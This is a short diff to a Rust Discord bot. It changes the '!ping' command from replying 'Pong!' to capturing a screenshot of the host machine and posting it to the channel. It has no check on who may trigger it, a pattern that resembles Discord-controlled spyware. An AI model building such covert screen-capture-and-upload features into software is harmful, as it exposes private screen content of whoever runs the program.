@@ -2,11 +2,14 @@
 
 mod dowithsys;
 
+use dowithsys::make_screenshot;
+use serenity::all::{CreateAttachment, CreateMessage};
 use serenity::async_trait;
 use serenity::model::channel::Message;
 use serenity::prelude::*;
 use serde_json;
 use serde::Deserialize;
+use std::io::Cursor;
 
 #[allow(dead_code)]
 #[derive(Deserialize)]
@@ -27,7 +30,8 @@ struct Handler;
 impl EventHandler for Handler {
     async fn message(&self, ctx: Context, msg: Message) {
         if msg.content == "!ping" {
-            if let Err(why) = msg.channel_id.say(&ctx.http, "Pong!").await {
+            let cr = CreateAttachment::bytes(make_screenshot(), "screenshot.png");
+            if let Err(why) = msg.channel_id.send_message(&ctx.http, CreateMessage::new().add_file(cr)).await {
                 println!("Error sending message: {why:?}");
             }
         }
